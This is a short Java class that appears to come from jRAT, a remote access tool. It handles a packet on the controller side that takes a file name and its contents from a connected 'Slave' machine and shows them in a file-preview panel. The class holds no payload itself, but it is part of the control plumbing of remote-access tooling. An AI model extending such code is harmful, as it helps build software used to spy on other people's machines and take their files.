package jrat.module.fs.packets;

import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPacket;
import jrat.module.fs.ui.PanelFileSystem;
import jrat.module.fs.ui.previews.PanelPreviewFile;


public class Packet42PreviewFile implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String file = slave.readLine();
		String content = slave.readLine();

        PanelFileSystem panel = (PanelFileSystem) slave.getPanel(PanelFileSystem.class);

		if (panel != null) {
            PanelPreviewFile handler = (PanelPreviewFile) panel.getPreviewHandler(file);

            if (handler != null) {
                handler.addData(content);
            }
		}
	}
}
